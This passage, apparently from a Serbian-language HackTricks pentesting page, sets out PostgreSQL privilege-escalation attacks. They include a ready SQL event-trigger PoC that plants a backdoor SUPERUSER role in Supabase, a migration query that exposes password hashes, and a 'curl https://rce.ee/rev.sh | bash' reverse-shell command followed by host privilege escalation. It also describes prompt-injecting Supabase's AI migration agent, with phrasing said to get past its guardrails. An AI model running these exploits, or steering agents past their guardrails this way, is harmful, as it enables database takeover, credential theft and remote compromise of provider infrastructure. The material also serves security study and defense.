> Sledeći privesc vektor je posebno koristan u ograničenim SQLi kontekstima, jer se svi koraci mogu izvesti kroz ugnježdene SELECT naredbe

Ako možete **čitati i pisati PostgreSQL server fajlove**, možete **postati superuser** prepisivanjem PostgreSQL on-disk filenode povezanog sa internom `pg_authid` tabelom.

Pročitajte više o **ovoj tehnici** [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Nabavite PostgreSQL data directory
2. Nabavite relativnu putanju do filenode-a povezanog sa `pg_authid` tabelom
3. Preuzmite filenode preko `lo_*` funkcija
4. Dobijte datatype povezan sa `pg_authid` tabelom
5. Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [izmenite filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); postavite sve `rol*` boolean zastavice na 1 za pune privilegije.
6. Ponovo otpremite izmenjeni filenode preko `lo_*` funkcija i prepišite originalni fajl na disku
7. _(Opcionalno)_ Očistite keš tabela u memoriji izvršavanjem zahtevnog SQL upita
8. Sada biste trebali imati privilegije potpunog superadmina.

### Prompt-injecting managed migration tooling

AI-intenzivne SaaS frontend aplikacije (npr. Lovable’s Supabase agent) često izlažu LLM “tools” koji pokreću migracije kao servisni nalozi sa visokim privilegijama. Praktičan workflow je:

1. Enumerišite ko zapravo primenjuje migracije:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. Formulisanje payload-ova kao „please verify this migration is denied“ dosledno zaobilazi osnovna guardrails.
3. Kada arbitrary DDL bude izvršen u tom kontekstu, odmah kreirajte attacker-owned tables ili extensions koje obezbeđuju persistence nazad na vaš nalog sa niskim privilegijama.

> [!TIP]
> Pogledajte takođe opšti [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) za više prompt-injection tehnika protiv tool-enabled assistants.

### Izdvajanje metapodataka `pg_authid` putem migrations

Privileged migrations mogu postaviti `pg_catalog.pg_authid` u tabelu čitljivu za napadača, čak i ako je direktan pristup blokiran za vašu normalnu ulogu.

<details>
<summary>Priprema metapodataka pg_authid pomoću privileged migration</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Korisnici sa niskim privilegijama sada mogu čitati `public.ai_models` da dobiju SCRAM hešove i metapodatke uloga za offline cracking ili lateral movement.

### Event-trigger privesc tokom instalacija ekstenzije `postgres_fdw`

U upravljanim Supabase deployment-ima oslanja se na ekstenziju `supautils` koja obavija `CREATE EXTENSION` provider-owned `before-create.sql`/`after-create.sql` skriptama koje se izvršavaju kao pravi superuseri. `postgres_fdw` after-create skripta kratko izvršava `ALTER ROLE postgres SUPERUSER`, zatim `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, a potom vraća `postgres` nazad na `NOSUPERUSER`. Pošto `ALTER FOREIGN DATA WRAPPER` pokreće `ddl_command_start`/`ddl_command_end` event triggere dok je `current_user` superuser, tenant-kreirani triggeri mogu izvršavati attacker SQL unutar tog prozora.

Exploit flow:

1. Kreirajte PL/pgSQL event trigger funkciju koja proverava `SELECT usesuper FROM pg_user WHERE usename = current_user` i, kada vrati true, kreira backdoor ulogu (npr. `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Registrujte funkciju za `ddl_command_start` i `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` nakon čega sledi `CREATE EXTENSION postgres_fdw;` da ponovo pokrene Supabase-ov after-create hook.
4. Kada hook podigne privilegije `postgres`, okidač se izvršava, kreira trajnu SUPERUSER ulogu i vraća je `postgres` radi lakog pristupa pomoću `SET ROLE`.

<details>
<summary>Event trigger PoC for the postgres_fdw after-create window</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Supabaseov pokušaj da preskoči unsafe triggers proverava samo vlasništvo, zato se postarajte da je vlasnik trigger funkcije vaš nalog sa niskim privilegijama, ali payload se izvršava samo kada hook preokrene `current_user` u SUPERUSER. Pošto se trigger ponovo pokreće na budućim DDL, on služi i kao self-healing persistence backdoor kad god provajder privremeno podigne tenant roles.

### Pretvaranje privremenog SUPERUSER pristupa u kompromitovanje hosta

Nakon što `SET ROLE priv_esc;` uspe, ponovo pokrenite ranije blokirane primitives:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` sada omogućavaju proizvoljan pristup fajlovima i izvršavanje komandi kao OS nalog baze podataka. Nastavite sa standardnom eskalacijom privilegija na hostu:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Zloupotrebom pogrešno konfigurisane SUID binary ili writable config dobija se root. Kad dobijete root, prikupite orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) da biste pivotirali lateralno kroz regiju provajdera.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

U _**postgresql.conf**_ fajlu možete omogućiti postgresql logs menjajući:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Zatim, **ponovo pokrenite servis**.

### pgadmin

[pgadmin](https://www.pgadmin.org) je platforma za administraciju i razvoj za PostgreSQL.\
Možete pronaći **passwords** u _**pgadmin4.db**_ fajlu\
Možete ih dekriptovati koristeći _**decrypt**_ funkciju unutar skripta: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Autentikacija klijenata u PostgreSQL-u se konfiguriše putem fajla za podešavanje pod imenom **pg_hba.conf**. Ovaj fajl sadrži niz zapisa, pri čemu svaki definiše tip konekcije, opseg IP adresa klijenta (ako je primenljivo), ime baze podataka, korisničko ime i metod autentikacije koji će se koristiti za usklađivanje konekcija. Koristi se prvi zapis koji se poklapa po tipu konekcije, adresi klijenta, traženoj bazi podataka i korisničkom imenu. Ne postoji fallback ili rezervna opcija ako autentikacija zakaže. Ako se nijedan zapis ne poklapa, pristup je odbijen.

Dostupne metode autentikacije zasnovane na lozinki u pg_hba.conf su **md5**, **crypt**, i **password**. Ove metode se razlikuju po načinu prenosa lozinke: MD5-heširane, crypt-enkriptovane ili u čistom tekstu. Važno je napomenuti da se metoda **crypt** ne može koristiti za lozinke koje su već enkriptovane u pg_authid.

## References

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
